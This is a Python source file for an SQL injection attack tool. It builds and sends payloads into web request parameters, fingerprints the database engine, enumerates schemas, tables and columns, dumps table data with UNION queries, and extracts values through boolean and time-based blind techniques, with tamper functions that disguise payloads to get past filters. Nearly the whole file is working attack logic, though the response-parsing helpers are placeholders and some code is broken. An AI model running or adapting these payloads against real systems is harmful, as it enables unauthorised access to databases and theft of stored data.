#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SQL Injection Payload Injector
"""

import time
import urllib.parse
from utils.requester import Requester
from utils.colors import Colors

class SQLiInjector:
    def __init__(self, vuln, dbms=None, tamper=None, threads=10):
        self.vuln = vuln
        self.dbms = dbms or 'mysql'
        self.tamper = tamper
        self.threads = threads
        
        self.requester = Requester()
        self.base_url = vuln['url']
        self.parameter = vuln['parameter']
        self.method = vuln['method']
        self.payload_type = vuln['type']
        
        self.comment = self._get_comment()
    
    def _get_comment(self):
        comments = {
            'mysql': '-- -',
            'mssql': '--',
            'postgres': '--',
            'oracle': '--',
            'sqlite': '--'
        }
        return comments.get(self.dbms, '-- -')
    
    def _tamper_payload(self, payload):
        if not self.tamper:
            return payload
        
        tampers = {
            'base64': lambda p: urllib.parse.quote(p.encode('base64').decode()),
            'space2comment': lambda p: p.replace(' ', '/**/'),
            'space2plus': lambda p: p.replace(' ', '+'),
            'charencode': lambda p: ''.join(f'%{hex(ord(c))[2:]}' for c in p),
            'randomcase': lambda p: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
            'multiplespaces': lambda p: p.replace(' ', '    '),
            'unionnull': lambda p: p.replace('NULL', 'NULL,NULL'),
        }
        
        if self.tamper in tampers:
            return tampers[self.tamper](payload)
        
        return payload
    
    def _inject(self, payload):
        payload = self._tamper_payload(payload)
        
        if self.method == 'GET':
            parsed = urllib.parse.urlparse(self.base_url)
            qs = urllib.parse.parse_qs(parsed.query)
            original = qs.get(self.parameter, [''])[0]
            qs[self.parameter] = [original + payload]
            new_query = urllib.parse.urlencode(qs, doseq=True)
            url = urllib.parse.urlunparse(parsed._replace(query=new_query))
            return self.requester.get(url)
        else:
            # POST injection
            data = f"{self.parameter}={payload}"
            return self.requester.post(self.base_url, data=data)
    
    def detect_dbms(self):
        if self.dbms:
            return self.dbms
        
        # Fingerprint DBMS
        tests = {
            'mysql': "1' AND @@version--",
            'mssql': "1' AND @@VERSION--",
            'postgres': "1' AND version()--",
            'oracle': "1' AND (SELECT banner FROM v$version WHERE ROWNUM=1)--",
            'sqlite': "1' AND sqlite_version()--"
        }
        
        for dbms, payload in tests.items():
            response = self._inject(payload)
            if response and response.status_code == 200:
                return dbms
        
        return 'mysql'  # Default fallback
    
    def get_db_count(self):
        if self.dbms == 'mysql':
            payload = f"1' AND (SELECT COUNT(*) FROM information_schema.schemata){self.comment}"
        elif self.dbms == 'postgres':
            payload = f"1' AND (SELECT COUNT(*) FROM pg_database){self.comment}"
        elif self.dbms == 'mssql':
            payload = f"1' AND (SELECT COUNT(*) FROM master..sysdatabases){self.comment}"
        else:
            return 1
        
        response = self._inject(payload)
        # Extract count from response (simplified)
        return self._extract_number(response)
    
    def get_db_name(self, index):
        if self.dbms == 'mysql':
            payload = f"1' AND (SELECT schema_name FROM information_schema.schemata LIMIT {index},1){self.comment}"
        elif self.dbms == 'postgres':
            payload = f"1' AND (SELECT datname FROM pg_database LIMIT 1 OFFSET {index}){self.comment}"
        elif self.dbms == 'mssql':
            payload = f"1' AND (SELECT name FROM master..sysdatabases ORDER BY name OFFSET {index} ROWS FETCH NEXT 1 ROWS ONLY){self.comment}"
        else:
            return 'unknown'
        
        response = self._inject(payload)
        return self._extract_string(response)
    
    def get_table_count(self, database):
        if self.dbms == 'mysql':
            payload = f"1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database}'){self.comment}"
        else:
            return 0
        
        response = self._inject(payload)
        return self._extract_number(response)
    
    def get_table_name(self, database, index):
        if self.dbms == 'mysql':
            payload = f"1' AND (SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {index},1){self.comment}"
        else:
            return 'unknown'
        
        response = self._inject(payload)
        return self._extract_string(response)
    
    def get_column_count(self, database, table):
        if self.dbms == 'mysql':
            payload = f"1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}'){self.comment}"
        else:
            return 0
        
        response = self._inject(payload)
        return self._extract_number(response)
    
    def get_column_name(self, database, table, index):
        if self.dbms == 'mysql':
            payload = f"1' AND (SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {index},1){self.comment}"
        else:
            return 'unknown'
        
        response = self._inject(payload)
        return self._extract_string(response)
    
    def get_data(self, database, table, columns, limit=100):
        col_str = ','.join(columns)
        if self.dbms == 'mysql':
            payload = f"1' UNION SELECT {col_str} FROM {database}.{table} LIMIT {limit}{self.comment}"
        else:
            return []
        
        response = self._inject(payload)
        return self._extract_data(response, columns)
    
    def _extract_number(self, response):
        # Simplified extraction - in real implementation would parse properly
        if not response:
            return 0
        return 0  # Placeholder
    
    def _extract_string(self, response):
        if not response:
            return ''
        return ''  # Placeholder
    
    def _extract_data(self, response, columns):
        if not response:
            return []
        return []  # Placeholder
    
    def blind_extract_char(self, query, position):
        """Boolean-based blind SQLi char extraction"""
        char = 0
        for bit in range(7, -1, -1):
            payload = f"1' AND ASCII(SUBSTRING(({query}),{position},1))&{2**bit}={2**bit}{self.comment}"
            response = self._inject(payload)
            if self._is_true(response):
                char |= 2**bit
        return chr(char) if char > 0 else None
    
    def blind_extract_length(self, query):
        """Boolean-based blind SQLi length extraction"""
        length = 0
        for i in range(1, 100):
            payload = f"1' AND LENGTH(({query}))={i}{self.comment}"
            response = self._inject(payload)
            if self._is_true(response):
                length = i
                break
        return length
    
    def time_based_extract_char(self, query, position):
        """Time-based blind SQLi char extraction"""
        char = 0
        for bit in range(7, -1, -1):
            if self.dbms == 'mysql':
                payload = f"1' AND IF(ASCII(SUBSTRING(({query}),{position},1))&{2**bit}={2**bit},SLEEP(2),0){self.comment}"
            elif self.dbms == 'postgres':
                payload = f"1' AND CASE WHEN ASCII(SUBSTRING(({query}),{position},1))&{2**bit}={2**bit} THEN pg_sleep(2) ELSE 0 END{self.comment}"
            elif self.dbms == 'mssql':
                payload = f"1'; IF ASCII(SUBSTRING(({query}),{position},1))&{2**bit}={2**bit} WAITFOR DELAY '0:0:2'{self.comment}"
            
            start = time.time()
            response = self._inject(payload)
            elapsed = time.time() - start
            
            if elapsed > 1.5:
                char |= 2**bit
        
        return chr(char) if char > 0 else None
    
    def _is_true(self, response):
        """Determine if boolean condition is true based on response"""
        if not response:
            return False
        # Compare with baseline true/false responses
        return response.status_code == 200 and len(response.text) > 100
